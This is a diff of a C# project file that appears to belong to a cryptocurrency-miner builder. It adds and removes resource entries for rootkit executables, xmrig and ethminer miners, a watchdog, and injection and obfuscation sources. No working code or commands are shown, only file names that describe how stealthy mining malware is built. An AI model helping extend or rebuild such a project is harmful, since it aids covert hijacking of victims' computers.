@@ -163,20 +163,25 @@
       <DesignTime>True</DesignTime>
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
-    <None Include="Resources\Rootkit\rootkit-i.exe" />
+    <None Include="Resources\Rootkit\Uninstall64.exe" />
+    <None Include="Resources\Rootkit\Service64.exe" />
     <None Include="Resources\Miners\nvrtc-builtins64_112.dll" />
     <None Include="Resources\Miners\nvrtc64_112_0.dll" />
     <None Include="Resources\Miners\ddb64.dll" />
     <None Include="Resources\Miners\xmrig.exe" />
     <None Include="Resources\Miners\ethminer.exe" />
     <None Include="Resources\Code\Checker.cs" />
-    <None Include="Resources\Code\Files.zip" />
     <None Include="Resources\Code\miner.cpp" />
     <None Include="Resources\Code\watchdog.cpp" />
+    <None Include="Resources\Code\Includes\common.cpp" />
+    <None Include="Resources\Code\Includes\common.h" />
+    <None Include="Resources\Code\Includes\inject.cpp" />
+    <None Include="Resources\Code\Includes\inject.h" />
+    <None Include="Resources\Code\Includes\ntddk.h" />
+    <None Include="Resources\Code\Includes\obfuscateu.h" />
     <Content Include="Resources\LocalizedControls.xml" />
     <None Include="Resources\Compilers\resource.rcf" />
     <None Include="Resources\Compilers\template.manifest-miner" />
-    <None Include="Resources\Rootkit\rootkit-u.zip" />
     <None Include="Program\app.config" />
     <None Include="Program\app.manifest">
       <SubType>Designer</SubType>
